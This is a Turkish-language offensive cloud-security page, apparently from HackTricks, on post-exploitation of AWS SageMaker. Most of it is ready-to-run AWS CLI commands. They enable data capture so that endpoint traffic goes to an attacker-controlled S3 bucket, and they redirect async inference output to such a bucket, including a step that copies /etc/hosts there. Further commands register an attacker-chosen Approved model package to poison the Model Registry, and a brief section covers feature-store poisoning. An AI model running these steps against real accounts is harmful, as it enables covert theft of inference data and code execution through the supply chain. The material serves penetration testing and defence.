# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint verilerini UpdateEndpoint DataCaptureConfig ile çekme

SageMaker endpoint yönetimini kötüye kullanarak, model veya container'a dokunmadan istek/yanıtların tamamının saldırgan tarafından kontrol edilen bir S3 bucket'ına kaydedilmesini etkinleştirin. Sıfır/düşük kesintiyle bir rolling update kullanır ve yalnızca endpoint yönetim izinleri gerektirir.

### Gereksinimler
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (veya aynı hesap içinde mevcut bir bucket kullanın)
- İsteğe bağlı (SSE‑KMS kullanılıyorsa): seçilen CMK üzerinde `kms:Encrypt`
- Hedef: Aynı hesap/bölge içinde mevcut bir InService gerçek zamanlı endpoint

### Adımlar
1) Bir InService endpoint'i belirleyin ve mevcut üretim varyantlarını toplayın
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Yakalamalar için attacker S3 hedefini hazırla
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Aynı varyantları koruyan ancak DataCapture'ı attacker bucket'a etkinleştiren yeni bir EndpointConfig oluşturun

Not: CLI doğrulamasını karşılayacak açık content-type'ları kullanın
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Yeni yapılandırmayı kademeli güncelleme ile uygulayın (minimum/hiç kesinti olmadan)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) En az bir inference çağrısı oluşturun (canlı trafik varsa isteğe bağlı)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) attacker S3'teki captures'ları doğrulayın
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Etki
- Hedeflenen endpoint'ten saldırgan kontrolündeki bir S3 bucket'ına gerçek zamanlı inference istek ve yanıt yüklerinin (ve metadata) tam dışa aktarımı.
- Model/container imajında değişiklik olmadan, yalnızca endpoint düzeyinde yapılan değişikliklerle minimal operasyonel aksama ile gizli bir veri hırsızlığı yolunun mümkün olması.

## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Mevcut EndpointConfig'i klonlayıp AsyncInferenceConfig.OutputConfig içindeki S3OutputPath/S3FailurePath'i ayarlayarak endpoint yönetimini suistimal edin ve asenkron inference çıktılarının saldırgan kontrolündeki bir S3 bucket'ına yönlendirilmesini sağlayın. Bu, model tahminlerini (ve container tarafından dönüştürülüp dahil edilen girdileri) model/container'ı değiştirmeden dışa aktarır.

### Gereksinimler
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: model execution role veya permissive bucket policy aracılığıyla saldırgan kontrolündeki S3 bucket'ına yazma yetkisi
- Hedef: Asenkron invokasyonların kullanıldığı (veya kullanılacak) bir InService endpoint

### Adımlar
1) Hedef endpoint'ten mevcut ProductionVariants'ları toplayın
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Bir attacker bucket oluşturun (model execution role'unun ona PutObject yapabildiğinden emin olun)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) EndpointConfig'i klonlayın ve AsyncInference çıktılarının saldırgan bucket'a yönlendirilmesini sağlayın
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Asenkron bir çağrı tetikleyin ve nesnelerin saldırganın S3'üne düştüğünü doğrulayın
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Etki
- Asenkron inference sonuçlarını (ve hata gövdelerini) saldırgan kontrollü S3'e yönlendirir; bu, model kodunu veya image'ı değiştirmeden ve minimum/hiç kesinti olmadan container tarafından üretilen tahminlerin ve potansiyel olarak hassas ön/son işlenmiş girdilerin gizli olarak sızdırılmasını sağlar.

## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Eğer bir saldırgan hedef bir SageMaker Model Package Group üzerinde CreateModelPackage yapabilirse, saldırgan kontrollü bir container image'a işaret eden yeni bir model sürümü kaydedip hemen Approved olarak işaretleyebilir. Birçok CI/CD pipeline'ı Approved model sürümlerini endpoint'lere veya training job'larına otomatik deploy eder; bu da servisin execution role'ları altında saldırgan kodu çalıştırılmasına yol açar. Hesaplar arası açık, izin verici bir ModelPackageGroup resource policy ile daha da büyütülebilir.

### Gereksinimler
- IAM (mevcut bir grubu zehirlemek için asgari izin): `sagemaker:CreateModelPackage` hedef ModelPackageGroup üzerinde
- İsteğe bağlı (bir grup yoksa oluşturmak için): `sagemaker:CreateModelPackageGroup`
- S3: Referans verilen ModelDataUrl için okuma erişimi (veya saldırgan kontrollü artefaktları barındırma)
- Hedef: Alt akış otomasyonunun Approved sürümleri izlediği bir Model Package Group

### Adımlar
1) Bölgeyi ayarla ve hedef bir Model Package Group oluşturun/bulun
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) S3'te örnek model verisi hazırlayın
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Kötü amaçlı (burada zararsız) bir Onaylı model paket sürümünü, public bir AWS DLC image'ını referans göstererek kaydetme
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Yeni Approved sürümün mevcut olduğunu doğrulayın
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Impact
- Model Registry'i, saldırgan-kontrolündeki koda referans veren Approved bir sürümle zehirleyin. Auto-deploy yapan Pipelines, Approved modelleri çekip saldırgan image'ını çalıştırabilir; bu, endpoint/training rolleri altında kod çalıştırılmasına yol açar.
- İzin veren bir ModelPackageGroup resource policy'si (PutModelPackageGroupPolicy) ile bu kötüye kullanım cross-account tetiklenebilir.

## Feature store poisoning

OnlineStore etkin bir Feature Group üzerinde `sagemaker:PutRecord`'ı kötüye kullanarak online inference tarafından tüketilen canlı feature değerlerini üzerine yazın. `sagemaker:GetRecord` ile birleştiğinde, saldırgan hassas feature'ları okuyabilir. Bunun için modellerin veya endpoint'lerin erişimine gerek yoktur.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
{{#include ../../../../banners/hacktricks-training.md}}
